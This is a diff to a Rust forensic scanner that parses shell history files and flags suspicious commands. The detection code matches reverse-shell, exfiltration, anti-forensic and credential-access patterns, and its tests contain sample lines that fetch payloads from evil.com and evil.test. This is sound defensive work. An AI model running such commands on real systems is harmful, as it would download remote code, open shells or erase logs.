@@ -19,8 +19,18 @@ pub struct ShellHistoryEntry {
     pub line_number: usize,
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct BashCommandAnalysis {
+    pub command: String,
+    pub is_suspicious: bool,
+    pub flags: Vec<&'static str>,
+}
+
 pub fn classify(path: &Path) -> Option<(&'static str, String)> {
-    let lower = path.to_string_lossy().replace('\\', "/").to_ascii_lowercase();
+    let lower = path
+        .to_string_lossy()
+        .replace('\\', "/")
+        .to_ascii_lowercase();
     let name = lower.rsplit('/').next().unwrap_or("");
     let username = username_from_path(&lower);
     match name {
@@ -32,7 +42,10 @@ pub fn classify(path: &Path) -> Option<(&'static str, String)> {
 }
 
 pub fn is_init_path(path: &Path) -> bool {
-    let lower = path.to_string_lossy().replace('\\', "/").to_ascii_lowercase();
+    let lower = path
+        .to_string_lossy()
+        .replace('\\', "/")
+        .to_ascii_lowercase();
     let name = lower.rsplit('/').next().unwrap_or("");
     matches!(
         name,
@@ -64,13 +77,19 @@ fn classify_command(cmd: &str) -> Option<&'static str> {
     if lc.contains("bash -i >& /dev/tcp/") || lc.contains("/dev/tcp/") || lc.contains("nc -e") {
         return Some("reverse-shell");
     }
-    let uses_fetch =
-        lc.contains("curl ") || lc.contains("wget ") || lc.contains("scp ") || lc.contains("rsync ");
+    let uses_fetch = lc.contains("curl ")
+        || lc.contains("wget ")
+        || lc.contains("scp ")
+        || lc.contains("rsync ");
     let has_remote = lc.contains("http://") || lc.contains("https://") || lc.contains('@');
     if uses_fetch && has_remote {
         return Some("exfil-download");
     }
-    if lc.contains("shred ") || lc.contains("wipe ") || lc.contains("rm -rf /var/log") || lc == "history -c" {
+    if lc.contains("shred ")
+        || lc.contains("wipe ")
+        || lc.contains("rm -rf /var/log")
+        || lc == "history -c"
+    {
         return Some("anti-forensic");
     }
     if lc.contains("crontab -e") || lc.contains("systemctl enable") || lc.contains(".bashrc") {
@@ -83,6 +102,40 @@ fn classify_command(cmd: &str) -> Option<&'static str> {
         return Some("priv-esc");
     }
     None
+}
+
+pub fn analyze_bash_command(cmd: &str) -> BashCommandAnalysis {
+    let lc = cmd.to_ascii_lowercase();
+    let mut flags = Vec::new();
+    if (lc.contains("wget ") || lc.contains("curl ")) && lc.contains("/tmp/") {
+        flags.push("download_to_tmp");
+    }
+    if lc.contains("wget ") || lc.contains("curl ") || lc.contains("scp ") || lc.contains("rsync ")
+    {
+        flags.push("network_transfer");
+    }
+    if lc.contains("base64 -d") || lc.contains("base64 --decode") {
+        flags.push("base64_decode");
+    }
+    if lc.contains("nc ") || lc.contains("netcat") || lc.contains("ncat ") || lc.contains("nc -e") {
+        flags.push("netcat");
+    }
+    if lc.contains("chmod +x") || lc.contains("chmod 755") || lc.contains("chmod 777") {
+        flags.push("make_executable");
+    }
+    if lc.contains("password=") || lc.contains("passwd=") || lc.contains("token=") {
+        flags.push("secret_in_command");
+    }
+    if flags.is_empty() {
+        if let Some(reason) = classify_command(cmd) {
+            flags.push(reason);
+        }
+    }
+    BashCommandAnalysis {
+        command: cmd.to_string(),
+        is_suspicious: !flags.is_empty(),
+        flags,
+    }
 }
 
 pub fn parse_bash(body: &str) -> Vec<ShellHistoryEntry> {
@@ -264,9 +317,7 @@ pub fn scan(path: &Path) -> Vec<Artifact> {
                         "title",
                         &format!(
                             "{} line {}: {}",
-                            path.file_name()
-                                .and_then(|n| n.to_str())
-                                .unwrap_or("init"),
+                            path.file_name().and_then(|n| n.to_str()).unwrap_or("init"),
                             idx + 1,
                             line.chars().take(80).collect::<String>()
                         ),
@@ -333,7 +384,10 @@ mod tests {
         let body = "#1717243200\nls /etc\n#1717243300\ncat /etc/passwd\n";
         let entries = parse_bash(body);
         assert_eq!(entries.len(), 2);
-        assert_eq!(entries[1].suspicious_pattern.as_deref(), Some("credential-access"));
+        assert_eq!(
+            entries[1].suspicious_pattern.as_deref(),
+            Some("credential-access")
+        );
         assert_eq!(
             entries[0].timestamp.map(|d| d.timestamp()),
             Some(1_717_243_200)
@@ -345,7 +399,10 @@ mod tests {
         let body = ": 1717243200:0;echo hi\n: 1717243300:1;curl https://evil.test/payload\n";
         let entries = parse_zsh(body);
         assert_eq!(entries.len(), 2);
-        assert_eq!(entries[1].suspicious_pattern.as_deref(), Some("exfil-download"));
+        assert_eq!(
+            entries[1].suspicious_pattern.as_deref(),
+            Some("exfil-download")
+        );
     }
 
     #[test]
@@ -375,9 +432,18 @@ mod tests {
         let path = home.join(".bash_history");
         std::fs::write(&path, "ls\nhistory -c\n").expect("w");
         let arts = scan(&path);
-        assert!(arts
-            .iter()
-            .any(|a| a.data.get("suspicious_pattern").map(|s| s.as_str())
-                == Some("anti-forensic")));
+        assert!(
+            arts.iter()
+                .any(|a| a.data.get("suspicious_pattern").map(|s| s.as_str())
+                    == Some("anti-forensic"))
+        );
+    }
+
+    #[test]
+    fn arbor_bash_history_flags_wget_download() {
+        let cmd = "wget http://evil.com/payload.sh -O /tmp/payload.sh";
+        let analysis = analyze_bash_command(cmd);
+        assert!(analysis.is_suspicious);
+        assert!(analysis.flags.contains(&"download_to_tmp"));
     }
 }
